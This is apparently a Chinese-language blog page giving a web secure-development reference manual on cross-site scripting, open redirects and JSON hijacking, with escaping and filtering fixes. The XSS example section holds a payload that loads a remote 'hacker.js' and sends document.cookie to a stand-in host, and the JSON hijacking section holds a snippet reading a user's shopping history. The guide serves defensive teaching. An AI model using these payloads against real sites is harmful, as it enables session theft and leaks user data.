@@ -1,0 +1,1195 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="安全,开发,code,安全开发,代码安全," />
+
+
+
+
+
+  <link rel="alternate" href="/rss.xml" title="Lost Maniac" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="1.客户端安全1.1. 跨站脚本漏洞1.1.1. 跨站脚本攻击说明  是由于程序员在编写程序时对用户输入的可控数据没有做充分的过滤或转义，直接把用 展现在页面中。当用户提交构造的脚本或 html 标签时，便会执行，这就是跨站脚本攻击。 1.1.1.1. 存储型跨站用户可控数据内容长期存储于页面中，当用户输入脚本或 HT">
+<meta name="keywords" content="安全,开发,code,安全开发,代码安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web安全开发参考手册">
+<meta property="og:url" content="http://maniac.vip/posts/600.html">
+<meta property="og:site_name" content="Lost Maniac">
+<meta property="og:description" content="1.客户端安全1.1. 跨站脚本漏洞1.1.1. 跨站脚本攻击说明  是由于程序员在编写程序时对用户输入的可控数据没有做充分的过滤或转义，直接把用 展现在页面中。当用户提交构造的脚本或 html 标签时，便会执行，这就是跨站脚本攻击。 1.1.1.1. 存储型跨站用户可控数据内容长期存储于页面中，当用户输入脚本或 HTML 标签时，输入的数据 长期展示在页面中，也就形成了储型跨站脚本攻击。 1.1">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-11-14T11:08:03.927Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="web安全开发参考手册">
+<meta name="twitter:description" content="1.客户端安全1.1. 跨站脚本漏洞1.1.1. 跨站脚本攻击说明  是由于程序员在编写程序时对用户输入的可控数据没有做充分的过滤或转义，直接把用 展现在页面中。当用户提交构造的脚本或 html 标签时，便会执行，这就是跨站脚本攻击。 1.1.1.1. 存储型跨站用户可控数据内容长期存储于页面中，当用户输入脚本或 HTML 标签时，输入的数据 长期展示在页面中，也就形成了储型跨站脚本攻击。 1.1">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://maniac.vip/posts/600.html"/>
+
+
+
+
+
+  <title>web安全开发参考手册 | Lost Maniac</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?6ece9853dbf154aa223dfef063628fe2";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lost Maniac</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人若无名便可专心练贱</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://maniac.vip/posts/600.html?day=20171116">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lost Maniac">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lost Maniac">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">web安全开发参考手册</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-16T15:52:56+08:00">
+                2017-11-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全文章/" itemprop="url" rel="index">
+                    <span itemprop="name">安全文章</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              
+                <a href="/posts/600.html?day=20171116#SOHUCS" itemprop="discussionUrl">
+                  <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="posts/600.html?day=20171116" itemprop="commentsCount"></span>
+                </a>
+              
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="1-客户端安全"><a href="#1-客户端安全" class="headerlink" title="1.客户端安全"></a>1.客户端安全</h1><h2 id="1-1-跨站脚本漏洞"><a href="#1-1-跨站脚本漏洞" class="headerlink" title="1.1. 跨站脚本漏洞"></a>1.1. 跨站脚本漏洞</h2><h3 id="1-1-1-跨站脚本攻击说明"><a href="#1-1-1-跨站脚本攻击说明" class="headerlink" title="1.1.1. 跨站脚本攻击说明"></a>1.1.1. 跨站脚本攻击说明</h3><p>  是由于程序员在编写程序时对用户输入的可控数据没有做充分的过滤或转义，直接把用 展现在页面中。当用户提交构造的脚本或 html 标签时，便会执行，这就是跨站脚本攻击。</p>
+<h4 id="1-1-1-1-存储型跨站"><a href="#1-1-1-1-存储型跨站" class="headerlink" title="1.1.1.1. 存储型跨站"></a>1.1.1.1. 存储型跨站</h4><p>用户可控数据内容长期存储于页面中，当用户输入脚本或 HTML 标签时，输入的数据 长期展示在页面中，也就形成了储型跨站脚本攻击。</p>
+<h4 id="1-1-1-2-反射型跨站"><a href="#1-1-1-2-反射型跨站" class="headerlink" title="1.1.1.2. 反射型跨站"></a>1.1.1.2. 反射型跨站</h4><p>在用户可控数据中，未长久保存于数据库中的数据，例如 URL 提交的参数，开发人员未 对参数做过滤或转码，导致前端直接展示相关数据，这样便形成了反射型跨站脚本漏洞。</p>
+<h4 id="1-1-1-3-Dom-型跨站"><a href="#1-1-1-3-Dom-型跨站" class="headerlink" title="1.1.1.3. Dom 型跨站"></a>1.1.1.3. Dom 型跨站</h4><p>当使用文档对象模型来创建文档的时候，对用户可控数据没有做正确的编码输出，便会 出现 DOM 型跨站脚本漏洞</p>
+<h3 id="1-1-2-跨站脚本示例"><a href="#1-1-2-跨站脚本示例" class="headerlink" title="1.1.2. 跨站脚本示例"></a>1.1.2. 跨站脚本示例</h3><p><strong>JAVA 代码示例</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(rs.next())</span><br><span class="line">&#123;</span><br><span class="line">    %&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">    &lt;td&gt;&lt;%=rs.getInt("id") %&gt;&lt;/td&gt;</span><br><span class="line">    &lt;td&gt;&lt;%=rs.getString("name")%&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;%</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>PHP 代码示例</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?</span>=$row[<span class="string">"id"</span>] <span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;td&gt;<span class="meta">&lt;?</span>=$row[<span class="string">"name"</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br></pre></td></tr></table></figure>
+<p>以上代码如果出现在京东某个应用中，当用户对 <strong>id</strong> 及 <strong>name</strong> 提交<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=http:<span class="comment">//x.x/hacker.js&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>hacker.js 文件内容:</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.location=<span class="string">"http://x.x/x.php?c="</span>+<span class="built_in">document</span>.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>当其他用户访问页面时，会执行远端 hacker.js 脚本，造成对其他用户的跨站脚本攻击。</p>
+<h3 id="1-1-3-跨站脚本漏洞影响"><a href="#1-1-3-跨站脚本漏洞影响" class="headerlink" title="1.1.3. 跨站脚本漏洞影响"></a>1.1.3. 跨站脚本漏洞影响</h3><p>恶意用户可以利用跨站脚本可以做到：</p>
+<ol>
+<li>盗取用户 <strong>cookie</strong>，伪造<strong>用户身份登录</strong>。 </li>
+<li>控制用户<strong>浏览</strong>器。</li>
+<li>结合浏览器及其插件漏洞，下载病毒<strong>木马</strong>到浏览者的计算机上执行。</li>
+<li>修改页面内容，产生<strong>钓鱼</strong>攻击效果。</li>
+<li>蠕虫攻击。 在三种跨站脚本漏洞中影响相对最大的是<strong>存储型</strong>跨站脚本漏洞。</li>
+</ol>
+<h3 id="1-1-4-HTML-跨站脚本漏洞"><a href="#1-1-4-HTML-跨站脚本漏洞" class="headerlink" title="1.1.4. HTML 跨站脚本漏洞"></a>1.1.4. HTML 跨站脚本漏洞</h3><p>当用户可控数据未经转义或过滤输出到 HTML 中时，用户提交恶意数据后形成 HTML 跨站 脚本攻击<br>HTMl 跨站分为反射型和存储型两种，反射型跨站需要被动诱骗点击，而存储型只需要 打开页面即可触发危害较大 常见的出现此类问题的主要有留言板，论坛发帖回帖，博客系统，评论系统</p>
+<h4 id="1-1-4-1-解决方案"><a href="#1-1-4-1-解决方案" class="headerlink" title="1.1.4.1. 解决方案"></a>1.1.4.1. 解决方案</h4><p>在 HTML 中展示用户可控数据，应该进行 <strong>html escape</strong> 转义<br>JSP代码<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;#escapeHTML($user.name) &lt;/div&gt; &lt;td&gt;#escapeHTML($user.name)&lt;/td&gt;</span><br></pre></td></tr></table></figure></p>
+<p> PHP代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;htmlentities($row[<span class="string">"user.name"</span>])&lt;/div&gt;</span><br></pre></td></tr></table></figure></p>
+<p>转义符号：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; --&gt; &amp;amp;</span><br><span class="line">&lt; --&gt; &amp;lt;</span><br><span class="line">&gt; --&gt; &amp;gt;</span><br><span class="line">&quot; --&gt; &amp;quot;</span><br><span class="line">&apos; --&gt; &amp;#39;</span><br></pre></td></tr></table></figure></p>
+<h4 id="1-1-4-2-escapeHTML-函数参考-JAVA-代码类"><a href="#1-1-4-2-escapeHTML-函数参考-JAVA-代码类" class="headerlink" title="1.1.4.2. escapeHTML 函数参考 JAVA 代码类"></a>1.1.4.2. escapeHTML 函数参考 JAVA 代码类</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://code.google.com/p/owasp-esapi-java/source/browse/trunk/src/main/java/org/owasp/esapi/codecs/HTMLEntityCodec.java</span><br></pre></td></tr></table></figure>
+<h3 id="1-1-5-JavaScript-跨站脚本漏洞"><a href="#1-1-5-JavaScript-跨站脚本漏洞" class="headerlink" title="1.1.5. JavaScript 跨站脚本漏洞"></a>1.1.5. JavaScript 跨站脚本漏洞</h3><p>当用户可控数据未经转义或过滤输出到 HTML 中时，用户提交恶意数据后形成 HTML 跨站脚本攻击<br>JavaScript 跨站与 HTMl 跨站很多人会搞混，两者的区别在于 HTML 跨站插入恶意脚 本必须带有 HTML 标签或者带有 HTML 伪协议标签，过滤起来要比 JavaScript 跨站简单， JavaScript 跨站只需要插入鼠标事件即可触发此类漏洞。<br>JavaScript 跨站也分为存储型和反射型，造成的影响也不同，反射型跨站需要被动诱骗 点击，而存储型只需要打开页面即可触发危害较大</p>
+<h4 id="1-1-5-1-解决方案"><a href="#1-1-5-1-解决方案" class="headerlink" title="1.1.5.1. 解决方案"></a>1.1.5.1. 解决方案</h4><p>在 JAVASCRIPT 中展示用户可控数据，需要对用户可控数据做 javascript escape 转义。</p>
+<h4 id="1-1-5-2-escapeJavaScript-转义函数参考代码"><a href="#1-1-5-2-escapeJavaScript-转义函数参考代码" class="headerlink" title="1.1.5.2. escapeJavaScript 转义函数参考代码"></a>1.1.5.2. escapeJavaScript 转义函数参考代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://code.google.com/p/owasp-esapi-java/source/browse/trunk/src/main/java/org/owasp/esapi/codecs/JavaScriptCodec.java</span><br></pre></td></tr></table></figure>
+<h3 id="1-1-6-JSON-跨站脚本漏洞"><a href="#1-1-6-JSON-跨站脚本漏洞" class="headerlink" title="1.1.6. JSON 跨站脚本漏洞"></a>1.1.6. JSON 跨站脚本漏洞</h3><p>Json 回传数据自定义函数名时，函数名可以通过 UTF-7 编码或其他编码造成跨站脚本 攻击</p>
+<p>Json 跨站与普通跨站区域别于格式，json 格式的匹配利用普通跨站代码很难实现，如果 http 传输设定为 json 必须通过 UTF-7 传输才能触发跨站漏洞，所以此类漏洞利用较难。</p>
+<h4 id="1-1-6-1-解决方案"><a href="#1-1-6-1-解决方案" class="headerlink" title="1.1.6.1. 解决方案"></a>1.1.6.1. 解决方案</h4><ol>
+<li>Java 代码 response.setContentType(“appliaction/json”); 按照以上设置，http 返回头为 appliaction/json</li>
+<li>对 callback=函数名做正则过滤</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String.replaceAll(“[^\w\_&quot;,&quot; &quot;);</span><br><span class="line">对函数名做严格过滤，只允许数字、大小写字母、下划线 以上方法可以彻底防御 json callback 跨站脚本攻击注：特殊情况下的 json 可在正则中放 宽相关字符，但是对于以下字符是严格禁止使用</span><br><span class="line">&apos;&quot;:;=|\/&amp;%#&#123;&#125;[]?#$@!()+-.</span><br></pre></td></tr></table></figure>
+<h4 id="1-1-6-2-参考代码"><a href="#1-1-6-2-参考代码" class="headerlink" title="1.1.6.2. 参考代码"></a>1.1.6.2. 参考代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//http 传输设置为 json 类型，相关代码如下</span><br><span class="line">response.setContentType(&quot;appliaction/json&quot;); </span><br><span class="line">//对 Callback 参数，特殊字符采用过滤的方 法</span><br><span class="line">public class CallbackXssUtil</span><br><span class="line">&#123;</span><br><span class="line">public static String filter(String CallbackStr)</span><br><span class="line">&#123;</span><br><span class="line">if(CallbackStr ==null || &quot;&quot;.equals(CallbackStr))</span><br><span class="line">&#123;	return &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">CallbackStr = inputStr.replaceAll(&quot;[^\\w\\_\\.]&quot;,&quot; &quot;);	return CallbackStr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="1-1-7-URL-跨站脚本漏洞"><a href="#1-1-7-URL-跨站脚本漏洞" class="headerlink" title="1.1.7. URL 跨站脚本漏洞"></a>1.1.7. URL 跨站脚本漏洞</h3><p>当系统把用户可控数据放入 URL 中，并且把 URL 直接输出到前端 HTML 页面或页面<br>Javascript 时，用户可控数据便可以构造攻击脚本，这种攻击我们叫做 URL 跨站脚本攻击。<br>URL 跨站和 HTML、JavaScript 跨站有很多相似的地方，因为最终用户可控 URL   还是会<br>输出到 HTML 和 JavaScript 中，但是 URL 跨站和 HTML、JavaScript 跨站的解决方法是 不同的。<br>常见 URL 跨站如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/?return=http://m.jd.com</span><br><span class="line">http://id.example.com/?return=http://my.jd.com</span><br></pre></td></tr></table></figure></p>
+<h4 id="1-1-7-1-解决方案"><a href="#1-1-7-1-解决方案" class="headerlink" title="1.1.7.1. 解决方案"></a>1.1.7.1. 解决方案</h4><p>URL 跨站脚本攻击不能过滤用户输入数据，因为过滤用户输入数据可能导致 URL 无法访 问，必须转义用户可控 URL，主要遵循以下转义方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt; =%3C</span><br><span class="line">&gt; = %3E</span><br><span class="line">/ = %2F</span><br><span class="line">? = %3F</span><br><span class="line">@ =%40</span><br><span class="line">&apos; = %27</span><br><span class="line">&quot; = %22</span><br><span class="line">\ = %5C</span><br></pre></td></tr></table></figure></p>
+<h4 id="1-1-7-2-参考实践代码"><a href="#1-1-7-2-参考实践代码" class="headerlink" title="1.1.7.2. 参考实践代码"></a>1.1.7.2. 参考实践代码</h4><p>在 php 中以下实现方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function z_urlencode($urlstr)</span><br><span class="line">&#123;</span><br><span class="line">    $httpStr = &quot;http://&quot;;	</span><br><span class="line">    $url= urlencode($urlstr);	</span><br><span class="line">    return $httpStr.$url;</span><br><span class="line">&#125;</span><br><span class="line">z_urlencode(&quot;www.360buy.com/index.action?start=1&amp;stop=2&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出为 http://www.360buy.com%2Findex.action%3Fstart%3D1%26stop%3D2</span><br></pre></td></tr></table></figure></p>
+<p>Jsp 中可用以下方法实现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URLEncoder.encode(&quot;www.360buy.com/index.action?start=1&amp;stop=2&quot;);</span><br><span class="line">&lt;% java.net.URLEncoder.encode(&quot;www.360buy.com/index.action?start=1&amp;stop=2&quot;,&quot;UTF-8&quot;;%&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="1-1-8-CSS-样式跨站脚本漏洞"><a href="#1-1-8-CSS-样式跨站脚本漏洞" class="headerlink" title="1.1.8. CSS 样式跨站脚本漏洞"></a>1.1.8. CSS 样式跨站脚本漏洞</h3><p>在用户与服务器交互访问的情况下，当页面样式 CSS 中展示用户可控数据时，攻击者会在 所提交的 CSS 中插入脚本，导致浏览此页面的用户浏览器会执行插入的 JavaScript 脚本。 CSS 跨站出现场景一般多在博客系统、文章发布系统、公告系统、留言系统中出现，CSS 多现于存储型跨站，危害较大。</p>
+<h4 id="1-1-8-1-解决方案"><a href="#1-1-8-1-解决方案" class="headerlink" title="1.1.8.1. 解决方案"></a>1.1.8.1. 解决方案</h4><p>同样是要对用户数可控输入中 style 内容做 CSS escape 转义调用方法</p>
+<h4 id="1-1-8-2-参考代码"><a href="#1-1-8-2-参考代码" class="headerlink" title="1.1.8.2. 参考代码"></a>1.1.8.2. 参考代码</h4><p><a href="http://code.google.com/p/owasp-esapi-java/source/browse/trunk/src/main/java/org/owasp/esapi/codecs/CSSCodec.java" target="_blank" rel="noopener">http://code.google.com/p/owasp-esapi-java/source/browse/trunk/src/main/java/org/owasp/esapi/codecs/CSSCodec.java</a></p>
+<h3 id="1-1-9-副文本跨站脚本漏洞"><a href="#1-1-9-副文本跨站脚本漏洞" class="headerlink" title="1.1.9. 副文本跨站脚本漏洞"></a>1.1.9. 副文本跨站脚本漏洞</h3><p>web 应用程序在一些场合需要允许一些 Html 标签，和一些标签里的一些属性，如一些日志 发表的地方，书写文章的地方，由于开发者对安全认识的局限或者在自己进行的安全过滤时 考虑不周，都容易带来跨站脚本攻击，在一些 web2.0 站点甚至引发 Xss Worm。常规的一 些检测措施包括黑名单，白名单等等，但是都因为过滤得并不全面，很容易被绕过。其实有 另外一种过滤相对严格的方法，就是基于 Html 语 法分析的 filter，在满足应用的同时可以 最大限度保证程序的安全，一些过滤比较严谨的如 Yahoo Mail，Gmail 等等就是基于该原 理进行的过滤。</p>
+<h4 id="1-1-9-1-解决方案"><a href="#1-1-9-1-解决方案" class="headerlink" title="1.1.9.1. 解决方案"></a>1.1.9.1. 解决方案</h4><ol>
+<li><p>白名单模式过滤相关恶意跨站脚本</p>
+</li>
+<li><p>黑名单模式过滤相关恶意跨站脚本</p>
+</li>
+</ol>
+<h2 id="1-2-URL-跳转漏洞"><a href="#1-2-URL-跳转漏洞" class="headerlink" title="1.2. URL 跳转漏洞"></a>1.2. URL 跳转漏洞</h2><h3 id="1-2-1-URL-跳转漏洞说明"><a href="#1-2-1-URL-跳转漏洞说明" class="headerlink" title="1.2.1. URL 跳转漏洞说明"></a>1.2.1. URL 跳转漏洞说明</h3><p>由于应用越来越多的需要和其他的第三方应用交互，以及在自身应用内部根据不同的 逻辑将用户引向到不同的页面，所以 URL 跳转便出现在我们的应用中，当对所跳转的连接 没有做验证的情况下可能跳到任何一个网站，导致了安全问题的产生，这种问题就是 URL 跳转漏洞</p>
+<h3 id="1-2-2-解决方案"><a href="#1-2-2-解决方案" class="headerlink" title="1.2.2. 解决方案"></a>1.2.2. 解决方案</h3><ol>
+<li>对跳转地址进行检测，当跳转地址非本域地址，强制跳转到主站 </li>
+<li>在控制页面转向的地方校验传入的 URL 是否为可信域名 3、对传入跳转 URL 中字符‘@’进行过滤</li>
+</ol>
+<h3 id="1-2-3-参考实践"><a href="#1-2-3-参考实践" class="headerlink" title="1.2.3. 参考实践"></a>1.2.3. 参考实践</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">暂缺</span><br></pre></td></tr></table></figure>
+<h2 id="1-3-JSON-挟持漏洞"><a href="#1-3-JSON-挟持漏洞" class="headerlink" title="1.3.    JSON 挟持漏洞"></a>1.3.    JSON 挟持漏洞</h2><h3 id="1-3-1-JSON-挟持漏洞说明"><a href="#1-3-1-JSON-挟持漏洞说明" class="headerlink" title="1.3.1. JSON 挟持漏洞说明"></a>1.3.1. JSON 挟持漏洞说明</h3><p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式，JSON 传输的数 据在两个不同的域，譬如对于大的互联网公司，代表了 A 应用的 A 域名想获取代表 B 应用 的 B 域名的数据时，由于在 javascript 里无法跨域获取数据，所以一般采取 script 标签的 方式获取数据，传入一些 callback 来获取最终的数据。这样导致非法网站也会调用相关接 口来实现数据的读取，导致了 json 传输数据的挟持</p>
+<h3 id="1-3-2-JSON-挟持实例"><a href="#1-3-2-JSON-挟持实例" class="headerlink" title="1.3.2.    JSON 挟持实例"></a>1.3.2.    JSON 挟持实例</h3><p>我们设定如下连接 </p>
+<p><a href="http://my.jd.com/global/track.action?jsoncallback=func" target="_blank" rel="noopener">http://my.jd.com/global/track.action?jsoncallback=func</a></p>
+<p>这里就是我们前面提到的一个使用 json 传递数据，支持自定义 callback、跨域使用 script 方式获取数据的典型例子，我们来写一段简单的攻击代码：</p>
+<p>这里 json 传递的数据是客户近期浏览商品的记录，攻击代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; function func(o)&#123; alert(o.history[0].wid + &apos;|&apos; + o.history[0].wname);&#125;&lt;/script&gt;</span><br><span class="line">&lt;script src=http://my.jd.com/global/track.action?jsoncallback=func&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>此攻击代码可以手机用户在京东的商品浏览历史。</p>
+<h3 id="1-3-3-JSON-挟持解决"><a href="#1-3-3-JSON-挟持解决" class="headerlink" title="1.3.3.    JSON 挟持解决"></a>1.3.3.    JSON 挟持解决</h3><ol>
+<li>验证 referer 来源，当非白名单域名，返回空信息</li>
+<li>改变 JSON 传输格式，彻底杜绝此类漏洞（这种解决方案改动较大，对业务影响较大， 但是非常彻底）；</li>
+</ol>
